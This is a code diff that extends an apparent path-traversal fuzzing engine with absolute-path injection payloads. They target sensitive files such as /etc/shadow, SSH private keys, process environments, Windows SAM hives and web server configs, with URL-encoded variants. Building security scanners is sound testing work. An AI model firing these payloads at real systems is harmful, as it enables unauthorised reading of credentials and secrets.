@@ -41,6 +41,77 @@ class TraversalEngine:
         '/etc/issue'
     ]
 
+    # Absolute path files for UNIX systems (direct absolute path injection)
+    UNIX_ABSOLUTE_FILES = [
+        '/etc/passwd',
+        '/etc/shadow',
+        '/etc/hosts',
+        '/etc/hostname', 
+        '/etc/issue',
+        '/etc/motd',
+        '/etc/group',
+        '/etc/fstab',
+        '/etc/crontab',
+        '/proc/self/environ',
+        '/proc/version',
+        '/proc/cmdline',
+        '/proc/self/stat',
+        '/proc/self/status',
+        '/var/log/auth.log',
+        '/var/log/syslog',
+        '/var/log/messages',
+        '/var/log/apache/access.log',
+        '/var/log/apache2/access.log',
+        '/var/log/apache/error.log',
+        '/var/log/apache2/error.log',
+        '/var/log/nginx/access.log',
+        '/var/log/nginx/error.log',
+        '/var/www/html/index.html',
+        '/var/www/index.html',
+        '/usr/local/apache/conf/httpd.conf',
+        '/usr/local/apache2/conf/httpd.conf',
+        '/etc/apache2/apache2.conf',
+        '/etc/apache2/sites-enabled/000-default',
+        '/etc/nginx/nginx.conf',
+        '/etc/nginx/sites-enabled/default',
+        '/home/www-data/.bash_history',
+        '/root/.bash_history',
+        '/home/[user]/.bash_history',
+        '/home/[user]/.ssh/id_rsa',
+        '/root/.ssh/id_rsa'
+    ]
+
+    # Absolute path files for Windows systems (direct absolute path injection)
+    WINDOWS_ABSOLUTE_FILES = [
+        'C:\\boot.ini',
+        'C:\\windows\\win.ini',
+        'C:\\windows\\system.ini',
+        'C:\\windows\\system32\\drivers\\etc\\hosts',
+        'C:\\windows\\system32\\config\\sam',
+        'C:\\windows\\system32\\config\\system',
+        'C:\\windows\\system32\\config\\software',
+        'C:\\windows\\system32\\config\\security',
+        'C:\\windows\\repair\\sam',
+        'C:\\windows\\repair\\system',
+        'C:\\windows\\php.ini',
+        'C:\\php\\php.ini',
+        'C:\\program files\\apache group\\apache\\conf\\httpd.conf',
+        'C:\\program files\\apache group\\apache2\\conf\\httpd.conf',
+        'C:\\program files (x86)\\apache group\\apache\\conf\\httpd.conf',
+        'C:\\apache\\conf\\httpd.conf',
+        'C:\\inetpub\\wwwroot\\index.html',
+        'C:\\inetpub\\wwwroot\\web.config',
+        'C:\\windows\\system32\\inetsrv\\config\\applicationHost.config',
+        'C:\\windows\\system32\\inetsrv\\config\\administration.config',
+        'C:\\windows\\microsoft.net\\framework\\v2.0.50727\\config\\web.config',
+        'C:\\windows\\microsoft.net\\framework64\\v2.0.50727\\config\\web.config',
+        'C:\\users\\administrator\\desktop\\desktop.ini',
+        'C:\\documents and settings\\administrator\\desktop\\desktop.ini',
+        'C:\\windows\\temp\\',
+        'C:\\temp\\',
+        'C:\\tmp\\'
+    ]
+
     # Extra files (only included if extra_files flag is enabled)
     EXTRA_FILES = [
         "config.inc.php",
@@ -107,7 +178,8 @@ class TraversalEngine:
         specific_file: Optional[str] = None,
         extra_files: bool = False,
         extension: Optional[str] = None,
-        bisection_depth: Optional[int] = None
+        bisection_depth: Optional[int] = None,
+        include_absolute: bool = True
     ) -> List[str]:
         """
         Generate traversal strings based on parameters
@@ -119,6 +191,7 @@ class TraversalEngine:
             extra_files: Include extra files from EXTRA_FILES
             extension: File extension to append to each fuzz string
             bisection_depth: If provided, use this depth for bisection algorithm
+            include_absolute: Include direct absolute path injection patterns (default: True)
             
         Returns:
             List of traversal strings to test
@@ -170,6 +243,17 @@ class TraversalEngine:
                     payload += extension
                     
                 final_traversals.append(payload)
+
+        # Add direct absolute path injection patterns
+        if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
+            if not self.quiet:
+                print("[+] Adding Direct Absolute Path Injection patterns")
+                
+            absolute_patterns = self._generate_absolute_patterns(os_type, specific_file, extra_files, extension)
+            final_traversals.extend(absolute_patterns)
+            
+            if not self.quiet:
+                print(f"[+] Added {len(absolute_patterns)} absolute path patterns")
 
         if not self.quiet:
             print(f"[+] Traversal Engine DONE! - Total traversal tests created: {len(final_traversals)}")
@@ -229,6 +313,111 @@ class TraversalEngine:
             adapted_file = adapted_file.replace("\\\\", "/")
 
         return adapted_file
+
+    def _generate_absolute_patterns(
+        self, 
+        os_type: OSType, 
+        specific_file: Optional[str], 
+        extra_files: bool, 
+        extension: Optional[str]
+    ) -> List[str]:
+        """
+        Generate direct absolute path injection patterns
+        
+        These patterns test for vulnerabilities where applications fail to validate
+        absolute paths or where path normalization is insufficient.
+        """
+        absolute_files = self._get_absolute_target_files(os_type, specific_file, extra_files)
+        
+        patterns = []
+        for abs_file in absolute_files:
+            # Add the direct absolute path
+            pattern = abs_file
+            if extension:
+                pattern += extension
+            patterns.append(pattern)
+            
+            # Add URL-encoded variations for absolute paths
+            encoded_variations = [
+                abs_file.replace('/', '%2f').replace('\\', '%5c'),
+                abs_file.replace('/', '%2F').replace('\\', '%5C'),
+                abs_file.replace('/', '\\'),  # Switch slashes
+                abs_file.replace('\\', '/'),  # Switch slashes
+            ]
+            
+            for variation in encoded_variations:
+                if variation != abs_file:  # Avoid duplicates
+                    pattern = variation
+                    if extension:
+                        pattern += extension
+                    patterns.append(pattern)
+        
+        return patterns
+
+    def _get_absolute_target_files(
+        self, 
+        os_type: OSType, 
+        specific_file: Optional[str], 
+        extra_files: bool
+    ) -> List[str]:
+        """Get list of absolute path target files based on OS type and settings"""
+        target_files = []
+        
+        # Always include comprehensive absolute path lists for better coverage
+        if os_type == OSType.WINDOWS:
+            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
+        elif os_type == OSType.UNIX:
+            target_files.extend(self.UNIX_ABSOLUTE_FILES)
+        else:  # GENERIC
+            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
+            target_files.extend(self.UNIX_ABSOLUTE_FILES)
+
+        # If specific file is provided, also include it
+        if specific_file:
+            # If it's already an absolute path, add as-is
+            if specific_file.startswith('/') or specific_file.startswith('C:') or specific_file.startswith('\\'):
+                if specific_file not in target_files:
+                    target_files.append(specific_file)
+            else:
+                # Convert relative to absolute based on OS and add
+                if os_type == OSType.WINDOWS:
+                    abs_file = f'C:\\{specific_file}'
+                    if abs_file not in target_files:
+                        target_files.append(abs_file)
+                elif os_type == OSType.UNIX:
+                    abs_file = f'/{specific_file}'
+                    if abs_file not in target_files:
+                        target_files.append(abs_file)
+                else:  # GENERIC - add for both systems
+                    win_abs = f'C:\\{specific_file}'
+                    unix_abs = f'/{specific_file}'
+                    if win_abs not in target_files:
+                        target_files.append(win_abs)
+                    if unix_abs not in target_files:
+                        target_files.append(unix_abs)
+
+        if extra_files:
+            # Add absolute versions of extra files
+            for extra_file in self.EXTRA_FILES:
+                if os_type == OSType.WINDOWS or os_type == OSType.GENERIC:
+                    abs_files = [
+                        f'C:\\{extra_file}',
+                        f'C:\\inetpub\\wwwroot\\{extra_file}'
+                    ]
+                    for af in abs_files:
+                        if af not in target_files:
+                            target_files.append(af)
+                            
+                if os_type == OSType.UNIX or os_type == OSType.GENERIC:
+                    abs_files = [
+                        f'/{extra_file}',
+                        f'/var/www/html/{extra_file}'
+                    ]
+                    for af in abs_files:
+                        if af not in target_files:
+                            target_files.append(af)
+
+        return target_files
 
     @staticmethod
     def detect_os_type(os_detail: str) -> OSType:
